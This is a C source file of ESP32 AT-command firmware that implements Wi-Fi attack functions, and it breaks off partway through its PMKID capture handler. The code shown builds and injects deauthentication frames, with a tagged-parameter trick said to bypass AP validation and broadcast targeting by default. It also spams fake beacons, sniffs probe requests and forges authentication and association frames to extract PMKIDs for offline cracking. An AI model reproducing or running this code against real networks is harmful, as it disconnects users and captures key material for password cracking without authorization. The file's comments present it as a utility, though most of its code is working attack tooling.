/*
 * at_custom_wifi_cmd.c — M1 SPI Wi-Fi utility AT commands
 * Includes monitor mode, deauth flood, beacon spam, probe sniff,
 * PMKID capture, karma attack, and handshake capture.
 */

#include <stdbool.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdarg.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_at.h"
#include "esp_log.h"
#include "esp_netif.h"
#include "esp_wifi.h"
#include "esp_random.h"

#include "at_custom_wifi_cmd.h"

static const char *TAG = "M1WiFi";

/* ------------------------------------------------------------------ */
/*  State tracking                                                     */
/* ------------------------------------------------------------------ */

static bool s_monitor_active = false;
static uint8_t s_monitor_channel = 1;

/* Attack task handles & control flags */
static TaskHandle_t s_deauth_task_handle = NULL;
static volatile bool s_deauth_stop_flag = false;
static volatile int32_t s_deauth_sent_count = 0;

static TaskHandle_t s_beacon_task_handle = NULL;
static volatile bool s_beacon_stop_flag = false;

static TaskHandle_t s_probe_task_handle = NULL;
static volatile bool s_probe_stop_flag = false;

static TaskHandle_t s_karma_task_handle = NULL;
static volatile bool s_karma_stop_flag = false;

static TaskHandle_t s_hscap_task_handle = NULL;
static volatile bool s_hscap_stop_flag = false;

/* ------------------------------------------------------------------ */
/*  Helpers                                                            */
/* ------------------------------------------------------------------ */

/* Parse "xx:xx:xx:xx:xx:xx" into 6 bytes. Returns true on success. */
static bool parse_mac(const char *str, uint8_t out[6])
{
    unsigned int a, b, c, d, e, f;
    if (sscanf(str, "%x:%x:%x:%x:%x:%x", &a, &b, &c, &d, &e, &f) != 6) {
        return false;
    }
    out[0] = (uint8_t)a; out[1] = (uint8_t)b; out[2] = (uint8_t)c;
    out[3] = (uint8_t)d; out[4] = (uint8_t)e; out[5] = (uint8_t)f;
    return true;
}

/* Format 6 bytes as "xx:xx:xx:xx:xx:xx" into dst (must be >= 18 bytes) */
static void format_mac(const uint8_t mac[6], char *dst)
{
    snprintf(dst, 18, "%02x:%02x:%02x:%02x:%02x:%02x",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

/* Send an unsolicited line to the host */
static void at_send_line(const char *fmt, ...)
{
    char buf[512];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    if (n > 0) {
        esp_at_port_write_data((uint8_t *)buf, (uint32_t)n);
    }
}

/* Stop a task by setting its stop flag and waiting for it to clear its handle */
static void stop_task(TaskHandle_t *handle, volatile bool *stop_flag)
{
    if (*handle == NULL) return;
    *stop_flag = true;
    int retry = 30;
    while (*handle != NULL && retry-- > 0) {
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    *handle = NULL;
    *stop_flag = false;
}

/* Stop any running attack tasks before entering a new mode */
static void stop_all_attacks(void)
{
    stop_task(&s_deauth_task_handle, &s_deauth_stop_flag);
    stop_task(&s_beacon_task_handle, &s_beacon_stop_flag);
    stop_task(&s_probe_task_handle, &s_probe_stop_flag);
    stop_task(&s_karma_task_handle, &s_karma_stop_flag);
    stop_task(&s_hscap_task_handle, &s_hscap_stop_flag);
}

/* Enter monitor mode on a given channel. Returns true on success. */
static bool enter_monitor(uint8_t channel)
{
    if (s_monitor_active && s_monitor_channel == channel) {
        return true;  /* already there */
    }

    stop_all_attacks();

    /* Disconnect STA if connected */
    esp_wifi_disconnect();
    vTaskDelay(pdMS_TO_TICKS(100));

    /* Stop wifi, set STA mode + promiscuous for TX capability
     * ESP32-C6 silently drops esp_wifi_80211_tx in WIFI_MODE_NULL.
     * Must use STA mode with promiscuous enabled for injection. */
    esp_wifi_stop();
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();
    vTaskDelay(pdMS_TO_TICKS(100));

    /* Enable promiscuous */
    esp_wifi_set_promiscuous(true);

    /* Set channel */
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    s_monitor_channel = channel;
    s_monitor_active = true;

    ESP_LOGI(TAG, "Monitor mode active on channel %d", channel);
    return true;
}

/* Exit monitor mode, restore STA */
static void exit_monitor(void)
{
    if (!s_monitor_active) return;

    stop_all_attacks();

    esp_wifi_set_promiscuous_rx_cb(NULL);
    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();
    vTaskDelay(pdMS_TO_TICKS(100));

    s_monitor_active = false;
    s_monitor_channel = 1;
    ESP_LOGI(TAG, "Monitor mode exited, STA restored");
}

/* ------------------------------------------------------------------ */
/*  AT+M1WIFISTATS?  (existing)                                       */
/* ------------------------------------------------------------------ */

static uint8_t at_query_cmd_m1wifistats(uint8_t *cmd_name)
{
#define AT_M1WIFISTATS_BUFFER_LEN 160
    uint8_t buffer[AT_M1WIFISTATS_BUFFER_LEN] = {0};
    wifi_mode_t wifi_mode = WIFI_MODE_NULL;
    wifi_ap_record_t ap_info = {0};
    esp_netif_ip_info_t ip_info = {0};
    esp_netif_t *sta_netif = NULL;
    const char *mode_text = "NULL";
    char bssid[18] = "00:00:00:00:00:00";
    char ip_addr[16] = "0.0.0.0";
    bool connected = false;
    int rssi = 0;
    uint8_t channel = 0;

    if (esp_wifi_get_mode(&wifi_mode) == ESP_OK) {
        switch (wifi_mode) {
        case WIFI_MODE_STA:     mode_text = "STA"; break;
        case WIFI_MODE_AP:      mode_text = "AP"; break;
        case WIFI_MODE_APSTA:   mode_text = "APSTA"; break;
        default:                mode_text = "NULL"; break;
        }
    }

    if (esp_wifi_sta_get_ap_info(&ap_info) == ESP_OK) {
        connected = true;
        rssi = ap_info.rssi;
        channel = ap_info.primary;
        snprintf(bssid, sizeof(bssid), "%02x:%02x:%02x:%02x:%02x:%02x",
                 ap_info.bssid[0], ap_info.bssid[1], ap_info.bssid[2],
                 ap_info.bssid[3], ap_info.bssid[4], ap_info.bssid[5]);
    }

    sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (sta_netif != NULL && esp_netif_get_ip_info(sta_netif, &ip_info) == ESP_OK) {
        snprintf(ip_addr, sizeof(ip_addr), IPSTR, IP2STR(&ip_info.ip));
    }

    snprintf((char *)buffer, sizeof(buffer), "%s:%d,%s,%d,%u,\"%s\",\"%s\"\r\n",
             cmd_name, connected ? 1 : 0, mode_text, rssi, channel, bssid, ip_addr);
    esp_at_port_write_data(buffer, (uint32_t)strlen((char *)buffer));
    return ESP_AT_RESULT_CODE_OK;
}

/* ------------------------------------------------------------------ */
/*  AT+M1MONITOR=1,<channel> / AT+M1MONITOR=0                        */
/* ------------------------------------------------------------------ */

static uint8_t at_setup_cmd_m1monitor(uint8_t para_num)
{
    int32_t enable = 0;

    if (esp_at_get_para_as_digit(0, &enable) != ESP_AT_PARA_PARSE_RESULT_OK) {
        return ESP_AT_RESULT_CODE_ERROR;
    }

    if (enable == 0) {
        exit_monitor();
        return ESP_AT_RESULT_CODE_OK;
    }

    if (enable == 1) {
        int32_t channel = 1;
        if (para_num < 2) {
            return ESP_AT_RESULT_CODE_ERROR;
        }
        if (esp_at_get_para_as_digit(1, &channel) != ESP_AT_PARA_PARSE_RESULT_OK) {
            return ESP_AT_RESULT_CODE_ERROR;
        }
        if (channel < 1 || channel > 14) {
            return ESP_AT_RESULT_CODE_ERROR;
        }
        if (!enter_monitor((uint8_t)channel)) {
            return ESP_AT_RESULT_CODE_ERROR;
        }
        return ESP_AT_RESULT_CODE_OK;
    }

    return ESP_AT_RESULT_CODE_ERROR;
}

/* ------------------------------------------------------------------ */
/*  AT+M1DEAUTH=<bssid>,<channel>[,<station_mac>,<count>]             */
/* ------------------------------------------------------------------ */

/* Deauth frame: 26 bytes
 * [frame_ctrl:2][duration:2][addr1:6][addr2:6][addr3:6][seq:2][reason:2] */
#define DEAUTH_FRAME_LEN 30  /* 26 base + 4 bytes tagged params (IE bypass) */

static void build_deauth_frame(uint8_t *frame, const uint8_t station[6],
                                const uint8_t ap[6], uint16_t reason)
{
    memset(frame, 0, DEAUTH_FRAME_LEN);
    /* Frame control: type=0 (management), subtype=12 (deauth) => 0x00C0 */
    frame[0] = 0xC0;
    frame[1] = 0x00;
    /* Duration */
    frame[2] = 0x00;
    frame[3] = 0x00;
    /* Address 1 = station (receiver) */
    memcpy(&frame[4], station, 6);
    /* Address 2 = ap (transmitter / BSSID) */
    memcpy(&frame[10], ap, 6);
    /* Address 3 = ap (BSSID) */
    memcpy(&frame[16], ap, 6);
    /* Sequence number = 0 */
    frame[22] = 0x00;
    frame[23] = 0x00;
    /* Reason code */
    frame[24] = (uint8_t)(reason & 0xFF);
    frame[25] = (uint8_t)((reason >> 8) & 0xFF);
    /* Tagged parameters (IE bypass):
     * Many 802.11 implementations silently drop deauth frames that contain
     * zero tagged parameters.  Including a minimal DS Parameter Set (tag 3,
     * length 1) with the current channel makes the frame pass validation on
     * APs that check for at least one IE after the reason code. */
    frame[26] = 0x03;  /* Tag: DS Parameter Set */
    frame[27] = 0x01;  /* Length: 1 */
    frame[28] = s_monitor_channel;  /* Current channel */
    frame[29] = 0x00;  /* Padding / FCS placeholder */
}

/* Statics for passing params to deauth task */
static uint8_t s_deauth_bssid[6];
static uint8_t s_deauth_station[6];
static int32_t s_deauth_count = 0;

static void deauth_task_func(void *arg)
{
    uint8_t frame[DEAUTH_FRAME_LEN];
    int32_t sent = 0;
    int32_t count = s_deauth_count;

    while (!s_deauth_stop_flag) {
        build_deauth_frame(frame, s_deauth_station, s_deauth_bssid, 7);
        esp_wifi_80211_tx(WIFI_IF_STA, frame, DEAUTH_FRAME_LEN, false);
        sent++;

        if (count > 0 && sent >= count) {
            break;
        }
        vTaskDelay(pdMS_TO_TICKS(100));  /* ~10 pkt/sec */
    }

    s_deauth_sent_count = sent;
    s_deauth_task_handle = NULL;
    vTaskDelete(NULL);
}

static uint8_t at_setup_cmd_m1deauth(uint8_t para_num)
{
    uint8_t *bssid_str = NULL;
    uint8_t *station_str = NULL;
    int32_t channel = 0;
    int32_t count = 0;
    uint8_t bssid[6];
    uint8_t station[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};  /* default broadcast */

    /* Param 0: BSSID (string) */
    ESP_LOGI(TAG, "M1DEAUTH: para_num=%d", (int)para_num);
    if (esp_at_get_para_as_str(0, &bssid_str) != ESP_AT_PARA_PARSE_RESULT_OK) {
        at_send_line("+M1DEAUTH:ERR:PARSE_BSSID\r\n");
        ESP_LOGE(TAG, "M1DEAUTH: failed to parse BSSID param");
        return ESP_AT_RESULT_CODE_ERROR;
    }
    if (!parse_mac((const char *)bssid_str, bssid)) {
        at_send_line("+M1DEAUTH:ERR:BAD_MAC\r\n");
        ESP_LOGE(TAG, "M1DEAUTH: invalid BSSID format: %s", (const char *)bssid_str);
        return ESP_AT_RESULT_CODE_ERROR;
    }

    /* Param 1: channel */
    if (esp_at_get_para_as_digit(1, &channel) != ESP_AT_PARA_PARSE_RESULT_OK) {
        at_send_line("+M1DEAUTH:ERR:PARSE_CH\r\n");
        ESP_LOGE(TAG, "M1DEAUTH: failed to parse channel param");
        return ESP_AT_RESULT_CODE_ERROR;
    }
    if (channel < 1 || channel > 14) {
        at_send_line("+M1DEAUTH:ERR:BAD_CH\r\n");
        ESP_LOGE(TAG, "M1DEAUTH: channel out of range: %ld", (long)channel);
        return ESP_AT_RESULT_CODE_ERROR;
    }

    /* Param 2: station MAC (optional) */
    if (para_num >= 3) {
        if (esp_at_get_para_as_str(2, &station_str) == ESP_AT_PARA_PARSE_RESULT_OK) {
            if (!parse_mac((const char *)station_str, station)) {
                return ESP_AT_RESULT_CODE_ERROR;
            }
        }
    }

    /* Param 3: count (optional, default 0 = continuous) */
    if (para_num >= 4) {
        if (esp_at_get_para_as_digit(3, &count) != ESP_AT_PARA_PARSE_RESULT_OK) {
            return ESP_AT_RESULT_CODE_ERROR;
        }
        if (count < 0) {
            return ESP_AT_RESULT_CODE_ERROR;
        }
    }

    /* Enter monitor mode if needed */
    if (!enter_monitor((uint8_t)channel)) {
        at_send_line("+M1DEAUTH:ERR:MONITOR\r\n");
        ESP_LOGE(TAG, "M1DEAUTH: enter_monitor(%d) failed", (int)channel);
        return ESP_AT_RESULT_CODE_ERROR;
    }

    /* Stop any existing deauth */
    stop_task(&s_deauth_task_handle, &s_deauth_stop_flag);

    /* Save params for the task */
    memcpy(s_deauth_bssid, bssid, 6);
    memcpy(s_deauth_station, station, 6);
    s_deauth_sent_count = 0;
    s_deauth_count = count;

    if (count > 0) {
        /* Finite count: run in task, wait for completion */
        s_deauth_stop_flag = false;
        xTaskCreate(deauth_task_func, "m1deauth", 4096, NULL, 5, &s_deauth_task_handle);
        /* Wait for task to finish */
        while (s_deauth_task_handle != NULL) {
            vTaskDelay(pdMS_TO_TICKS(50));
        }
        at_send_line("+M1DEAUTH:%ld\r\n", (long)s_deauth_sent_count);
        return ESP_AT_RESULT_CODE_OK;
    }

    /* Continuous: launch task, return immediately */
    s_deauth_stop_flag = false;
    xTaskCreate(deauth_task_func, "m1deauth", 4096, NULL, 5, &s_deauth_task_handle);
    return ESP_AT_RESULT_CODE_OK;
}

/* ------------------------------------------------------------------ */
/*  AT+M1DEAUTHSTOP  (exec)                                           */
/* ------------------------------------------------------------------ */

static uint8_t at_exe_cmd_m1deauthstop(uint8_t *cmd_name)
{
    if (!s_deauth_task_handle) {
        at_send_line("+M1DEAUTHSTOP:0\r\n");
        return ESP_AT_RESULT_CODE_OK;
    }

    s_deauth_stop_flag = true;
    /* Wait for task to exit */
    int retry = 30;
    while (s_deauth_task_handle != NULL && retry-- > 0) {
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    s_deauth_stop_flag = false;

    at_send_line("+M1DEAUTHSTOP:%ld\r\n", (long)s_deauth_sent_count);
    return ESP_AT_RESULT_CODE_OK;
}

/* ------------------------------------------------------------------ */
/*  AT+M1BEACON=1,<ssid1>[,<ssid2>,...] / AT+M1BEACON=0               */
/* ------------------------------------------------------------------ */

#define MAX_BEACON_SSIDS 8
#define MAX_SSID_LEN 32

static char s_beacon_ssids[MAX_BEACON_SSIDS][MAX_SSID_LEN + 1];
static int s_beacon_ssid_count = 0;

static void build_beacon_frame(uint8_t *frame, int *frame_len,
                                const char *ssid, uint8_t channel)
{
    int pos = 0;
    uint8_t mac[6];
    /* Generate random BSSID */
    for (int i = 0; i < 6; i++) {
        mac[i] = (uint8_t)(esp_random() & 0xFF);
    }
    mac[0] &= 0xFE;  /* clear multicast bit */
    mac[0] |= 0x02;  /* set locally administered bit */

    /* Frame control: type=0 (mgmt), subtype=8 (beacon) => 0x0080 */
    frame[pos++] = 0x80;
    frame[pos++] = 0x00;
    /* Duration */
    frame[pos++] = 0x00;
    frame[pos++] = 0x00;
    /* Address 1 = broadcast */
    memset(&frame[pos], 0xFF, 6); pos += 6;
    /* Address 2 = random BSSID */
    memcpy(&frame[pos], mac, 6); pos += 6;
    /* Address 3 = random BSSID (same) */
    memcpy(&frame[pos], mac, 6); pos += 6;
    /* Sequence number = 0 */
    frame[pos++] = 0x00;
    frame[pos++] = 0x00;
    /* Timestamp (8 bytes) */
    uint64_t ts = (uint64_t)(xTaskGetTickCount() * portTICK_PERIOD_MS);
    memcpy(&frame[pos], &ts, 8); pos += 8;
    /* Beacon interval = 100 TUs (0x0064) */
    frame[pos++] = 0x64;
    frame[pos++] = 0x00;
    /* Capability info: 0x0411 = ESS + Short-Preamble + Short-Slot-Time */
    frame[pos++] = 0x11;
    frame[pos++] = 0x04;
    /* SSID tag: id=0, len, ssid */
    uint8_t ssid_len = (uint8_t)strlen(ssid);
    frame[pos++] = 0x00;       /* tag ID: SSID */
    frame[pos++] = ssid_len;
    memcpy(&frame[pos], ssid, ssid_len); pos += ssid_len;
    /* Supported rates tag: id=1, len=8 */
    frame[pos++] = 0x01;       /* tag ID: Supported Rates */
    frame[pos++] = 0x08;
    frame[pos++] = 0x82;       /* 1 Mbps */
    frame[pos++] = 0x84;       /* 2 Mbps */
    frame[pos++] = 0x8B;       /* 5.5 Mbps */
    frame[pos++] = 0x96;       /* 11 Mbps */
    frame[pos++] = 0x0C;       /* 6 Mbps */
    frame[pos++] = 0x12;       /* 9 Mbps */
    frame[pos++] = 0x18;       /* 12 Mbps */
    frame[pos++] = 0x24;       /* 18 Mbps */
    /* DS Parameter Set tag: id=3, len=1, channel */
    frame[pos++] = 0x03;       /* tag ID: DS Parameter Set */
    frame[pos++] = 0x01;
    frame[pos++] = channel;

    *frame_len = pos;
}

static void beacon_task_func(void *arg)
{
    uint8_t frame[256];
    int frame_len;
    int idx = 0;

    while (!s_beacon_stop_flag) {
        build_beacon_frame(frame, &frame_len,
                           s_beacon_ssids[idx], s_monitor_channel);
        esp_wifi_80211_tx(WIFI_IF_STA, frame, frame_len, false);

        idx = (idx + 1) % s_beacon_ssid_count;
        vTaskDelay(pdMS_TO_TICKS(100));  /* ~10 beacons/sec total */
    }

    s_beacon_task_handle = NULL;
    vTaskDelete(NULL);
}

static uint8_t at_setup_cmd_m1beacon(uint8_t para_num)
{
    int32_t enable = 0;

    if (esp_at_get_para_as_digit(0, &enable) != ESP_AT_PARA_PARSE_RESULT_OK) {
        return ESP_AT_RESULT_CODE_ERROR;
    }

    if (enable == 0) {
        /* Stop beacon spam */
        stop_task(&s_beacon_task_handle, &s_beacon_stop_flag);
        s_beacon_ssid_count = 0;
        return ESP_AT_RESULT_CODE_OK;
    }

    if (enable == 1) {
        /* Start beacon spam — need at least one SSID */
        if (para_num < 2) {
            return ESP_AT_RESULT_CODE_ERROR;
        }

        /* Collect SSIDs from params 1..N */
        int ssid_count = 0;
        for (int i = 1; i < para_num && ssid_count < MAX_BEACON_SSIDS; i++) {
            uint8_t *ssid_str = NULL;
            if (esp_at_get_para_as_str(i, &ssid_str) != ESP_AT_PARA_PARSE_RESULT_OK) {
                return ESP_AT_RESULT_CODE_ERROR;
            }
            if (ssid_str == NULL || strlen((char *)ssid_str) == 0) {
                continue;
            }
            strncpy(s_beacon_ssids[ssid_count], (char *)ssid_str, MAX_SSID_LEN);
            s_beacon_ssids[ssid_count][MAX_SSID_LEN] = '\0';
            ssid_count++;
        }
        if (ssid_count == 0) {
            return ESP_AT_RESULT_CODE_ERROR;
        }
        s_beacon_ssid_count = ssid_count;

        /* Ensure monitor mode */
        if (!s_monitor_active) {
            if (!enter_monitor(s_monitor_channel)) {
                return ESP_AT_RESULT_CODE_ERROR;
            }
        }

        stop_task(&s_beacon_task_handle, &s_beacon_stop_flag);

        s_beacon_stop_flag = false;
        xTaskCreate(beacon_task_func, "m1beacon", 4096, NULL, 5,
                    &s_beacon_task_handle);
        return ESP_AT_RESULT_CODE_OK;
    }

    return ESP_AT_RESULT_CODE_ERROR;
}

/* ------------------------------------------------------------------ */
/*  AT+M1PROBE=1,<channel>,<duration_sec> / AT+M1PROBE=0              */
/* ------------------------------------------------------------------ */

static volatile int32_t s_probe_duration_sec = 0;

static void probe_promisc_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (type != WIFI_PKT_MGMT || s_probe_stop_flag) return;

    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    const uint8_t *payload = pkt->payload;
    uint16_t frame_ctrl = payload[0] | (payload[1] << 8);

    /* Management frame, subtype 4 = probe request */
    if ((frame_ctrl & 0x00F0) != 0x0040) return;

    /* Extract source MAC (addr2, offset 10) */
    char mac_str[18];
    format_mac(&payload[10], mac_str);

    int rssi = pkt->rx_ctrl.rssi;

    /* Parse SSID from tagged parameters (offset 24 after fixed fields) */
    char ssid[33] = "";
    int pos = 24;  /* After frame_ctrl(2)+dur(2)+addr1(6)+addr2(6)+addr3(6)+seq(2) */
    int end = pkt->rx_ctrl.sig_len;
    while (pos + 2 <= end) {
        uint8_t tag_id = payload[pos];
        uint8_t tag_len = payload[pos + 1];
        if (pos + 2 + tag_len > end) break;
        if (tag_id == 0 && tag_len > 0 && tag_len <= 32) {  /* SSID */
            memcpy(ssid, &payload[pos + 2], tag_len);
            ssid[tag_len] = '\0';
            break;
        }
        pos += 2 + tag_len;
    }

    at_send_line("+M1PROBE:%s,%d,%s\r\n", mac_str, rssi, ssid);
}

static void probe_task_func(void *arg)
{
    /* Install promiscuous callback */
    esp_wifi_set_promiscuous_rx_cb(probe_promisc_cb);

    /* Set filter for management frames */
    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT,
    };
    esp_wifi_set_promiscuous_filter(&filter);

    /* Wait for duration or stop flag */
    int32_t dur = s_probe_duration_sec;
    TickType_t start = xTaskGetTickCount();
    TickType_t dur_ticks = pdMS_TO_TICKS(dur * 1000);

    while (!s_probe_stop_flag) {
        if (dur > 0 && (xTaskGetTickCount() - start) >= dur_ticks) {
            break;
        }
        vTaskDelay(pdMS_TO_TICKS(500));
    }

    /* Remove callback */
    esp_wifi_set_promiscuous_rx_cb(NULL);

    s_probe_task_handle = NULL;
    vTaskDelete(NULL);
}

static uint8_t at_setup_cmd_m1probe(uint8_t para_num)
{
    int32_t enable = 0;

    if (esp_at_get_para_as_digit(0, &enable) != ESP_AT_PARA_PARSE_RESULT_OK) {
        return ESP_AT_RESULT_CODE_ERROR;
    }

    if (enable == 0) {
        stop_task(&s_probe_task_handle, &s_probe_stop_flag);
        esp_wifi_set_promiscuous_rx_cb(NULL);
        return ESP_AT_RESULT_CODE_OK;
    }

    if (enable == 1) {
        int32_t channel = 1;
        int32_t duration = 0;

        if (para_num < 3) {
            return ESP_AT_RESULT_CODE_ERROR;
        }
        if (esp_at_get_para_as_digit(1, &channel) != ESP_AT_PARA_PARSE_RESULT_OK ||
            channel < 1 || channel > 14) {
            return ESP_AT_RESULT_CODE_ERROR;
        }
        if (esp_at_get_para_as_digit(2, &duration) != ESP_AT_PARA_PARSE_RESULT_OK ||
            duration < 0) {
            return ESP_AT_RESULT_CODE_ERROR;
        }

        /* Enter monitor mode */
        if (!enter_monitor((uint8_t)channel)) {
            return ESP_AT_RESULT_CODE_ERROR;
        }

        stop_task(&s_probe_task_handle, &s_probe_stop_flag);

        s_probe_stop_flag = false;
        s_probe_duration_sec = duration;

        xTaskCreate(probe_task_func, "m1probe", 4096, NULL, 5,
                    &s_probe_task_handle);
        return ESP_AT_RESULT_CODE_OK;
    }

    return ESP_AT_RESULT_CODE_ERROR;
}

/* ------------------------------------------------------------------ */
/*  AT+M1PMKID=<bssid>,<channel>                                      */
/* ------------------------------------------------------------------ */

static uint8_t s_pmkid_target_bssid[6];
static volatile bool s_pmkid_captured = false;
static char s_pmkid_hex[33]; /* 16 bytes = 32 hex chars + null */

/* Build an 802.11 authentication frame (open system) */
static int build_auth_frame(uint8_t *frame, const uint8_t ap[6])
{
    uint8_t my_mac[6];
    for (int i = 0; i < 6; i++) {
        my_mac[i] = (uint8_t)(esp_random() & 0xFF);
    }
    my_mac[0] &= 0xFE;
    my_mac[0] |= 0x02;

    int pos = 0;
    /* Frame control: type=0 (mgmt), subtype=11 (auth) => 0x00B0 */
    frame[pos++] = 0xB0;
    frame[pos++] = 0x00;
    /* Duration */
    frame[pos++] = 0x00;
    frame[pos++] = 0x00;
    /* Addr1 = AP */
    memcpy(&frame[pos], ap, 6); pos += 6;
    /* Addr2 = us */
    memcpy(&frame[pos], my_mac, 6); pos += 6;
    /* Addr3 = AP */
    memcpy(&frame[pos], ap, 6); pos += 6;
    /* Seq */
    frame[pos++] = 0x00;
    frame[pos++] = 0x00;
    /* Auth algo: 0 = Open System */
    frame[pos++] = 0x00;
    frame[pos++] = 0x00;
    /* Auth transaction: 1 */
    frame[pos++] = 0x01;
    frame[pos++] = 0x00;
    /* Status: 0 */
    frame[pos++] = 0x00;
    frame[pos++] = 0x00;
    return pos;
}

/* Build an 802.11 association request frame */
static int build_assoc_frame(uint8_t *frame, const uint8_t ap[6])
{
    uint8_t my_mac[6];
    for (int i = 0; i < 6; i++) {
        my_mac[i] = (uint8_t)(esp_random() & 0xFF);
    }
    my_mac[0] &= 0xFE;
    my_mac[0] |= 0x02;

    int pos = 0;
    /* Frame control: type=0 (mgmt), subtype=0 (assoc req) => 0x0000 */
    frame[pos++] = 0x00;
    frame[pos++] = 0x00;
    /* Duration */
    frame[pos++] = 0x00;
    frame[pos++] = 0x00;
    /* Addr1 = AP */
    memcpy(&frame[pos], ap, 6); pos += 6;
    /* Addr2 = us */
    memcpy(&frame[pos], my_mac, 6); pos += 6;
    /* Addr3 = AP */
    memcpy(&frame[pos], ap, 6); pos += 6;
    /* Seq */
    frame[pos++] = 0x00;
    frame[pos++] = 0x00;
    /* Capability: 0x0411 */
    frame[pos++] = 0x11;
    frame[pos++] = 0x04;
    /* Listen interval: 10 */
    frame[pos++] = 0x0A;
    frame[pos++] = 0x00;
    /* SSID tag (empty SSID — broadcast) */
    frame[pos++] = 0x00;  /* tag ID */
    frame[pos++] = 0x00;  /* len = 0 */
    /* Supported rates */
    frame[pos++] = 0x01;
    frame[pos++] = 0x08;
    frame[pos++] = 0x82;
    frame[pos++] = 0x84;
    frame[pos++] = 0x8B;
    frame[pos++] = 0x96;
    frame[pos++] = 0x0C;
    frame[pos++] = 0x12;
    frame[pos++] = 0x18;
    frame[pos++] = 0x24;
    /* RSN element (minimal WPA2) */
    frame[pos++] = 0x30;  /* RSN ID */
    frame[pos++] = 0x14;  /* length 20 */
    frame[pos++] = 0x01; frame[pos++] = 0x00;  /* version 1 */
    frame[pos++] = 0x00; frame[pos++] = 0x0F; frame[pos++] = 0xAC; frame[pos++] = 0x04; /* CCMP */
    frame[pos++] = 0x01; frame[pos++] = 0x00;  /* key management count */
    frame[pos++] = 0x00; frame[pos++] = 0x0F; frame[pos++] = 0xAC; frame[pos++] = 0x02; /* PSK */
    frame[pos++] = 0x00; frame[pos++] = 0x0F; frame[pos++] = 0xAC; frame[pos++] = 0x04; /* CCMP */
    frame[pos++] = 0x00; frame[pos++] = 0x00; /* RSN capabilities */

    return pos;
}

static void pmkid_promisc_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (type != WIFI_PKT_DATA || s_pmkid_captured) return;

    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    const uint8_t *payload = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;

    if (len < 34) return;

    /* Check if it's from our target BSSID (addr2) */
    if (memcmp(&payload[10], s_pmkid_target_bssid, 6) != 0) return;

    uint16_t fc = payload[0] | (payload[1] << 8);
    /* Data frame */
    if ((fc & 0x000C) != 0x0008) return;

    /* Determine header length */
    int hdr_len = 24;
    if ((fc & 0x0800) != 0) hdr_len += 2;  /* QoS */
    if (hdr_len + 8 > len) return;

    /* Check LLC/SNAP + EAPOL ethertype (0x888E) */
    if (payload[hdr_len] != 0xAA || payload[hdr_len+1] != 0xAA) return;
    if (payload[hdr_len+6] != 0x88 || payload[hdr_len+7] != 0x8E) return;

    int eapol_off = hdr_len + 8;
    if (eapol_off + 5 > len) return;

    /* Check descriptor type = EAPOL-Key (0x02 or 0xFE) */
    uint8_t desc_type = payload[eapol_off + 4];
    if (desc_type != 0x02 && desc_type != 0xFE) return;

    /* Need enough for full EAPOL-Key header to reach key_data_length field:
     * EAPOL header(4) + desc_type(1) + key_info(2) + key_length(2) +
     * replay_counter(8) + nonce(32) + key_iv(16) + key_rsc(8) +
     * key_id(8) + key_mic(16) + key_data_length(2) = 97
     * Plus the EAPOL offset means we need eapol_off + 99 bytes minimum */
    if (eapol_off + 99 > len) return;

    /* Key Data Length at offset 97 from EAPOL body start (eapol_off + 4 + 93) */
    /* Actually: offset from eapol_off:
     *   +4  = descriptor_type
     *   +5,+6 = key_info
     *   +7,+8 = key_length
     *   +9..+16 = replay_counter
     *   +17..+48 = nonce (32 bytes)
     *   +49..+64 = key_iv
     *   +65..+72 = key_rsc
     *   +73..+80 = key_id
     *   +81..+96 = key_mic
     *   +97,+98 = key_data_length
     */
    uint16_t key_data_len = payload[eapol_off + 97] | (payload[eapol_off + 98] << 8);

    /* Check if PMKID is present in key data (key_info bit 8 = Pairwise key,
     * and key_data_len > 0 with the first element being an RSN IE or KDE) */
    /* PMKID KDE format: type=0xDD, OUI=00:0F:AC, type=1, then 16 bytes PMKID */
    int kd_off = eapol_off + 99;  /* start of key data */
    if (kd_off + 4 > len) return;

    /* Look for vendor-specific KDE with PMKID */
    for (int i = kd_off; i + 20 <= kd_off + key_data_len && i + 20 <= len; i++) {
        if (payload[i] == 0xDD &&       /* vendor specific */
            payload[i+2] == 0x00 && payload[i+3] == 0x0F && payload[i+4] == 0xAC &&
            payload[i+5] == 0x01) {      /* PMKID type */
            /* Found PMKID: 16 bytes starting at i+6 */
            for (int j = 0; j < 16; j++) {
                snprintf(&s_pmkid_hex[j*2], 3, "%02x", payload[i+6+j]);
            }
            s_pmkid_hex[32] = '\0';
            s_pmkid_captured = true;
            return;
        }
    }
}

static uint8_t at_setup_cmd_m1pmkid(uint8_t para_num)
{
    uint8_t *bssid_str = NULL;
    int32_t channel = 0;
    uint8_t bssid[6];
    uint8_t frame[256];
    int frame_len;

    if (para_num < 2) {
        return ESP_AT_RESULT_CODE_ERROR;
    }

    if (esp_at_get_para_as_str(0, &bssid_str) != ESP_AT_PARA_PARSE_RESULT_OK) {
        return ESP_AT_RESULT_CODE_ERROR;
    }
    if (!parse_mac((const char *)bssid_str, bssid)) {
        return ESP_AT_RESULT_CODE_ERROR;
    }

    if (esp_at_get_para_as_digit(1, &channel) != ESP_AT_PARA_PARSE_RESULT_OK ||
        channel < 1 || channel > 14) {
        return ESP_AT_RESULT_CODE_ERROR;
    }

    /* Enter monitor mode */
    if (!enter_monitor((uint8_t)channel)) {
        return ESP_AT_RESULT_CODE_ERROR;
    }

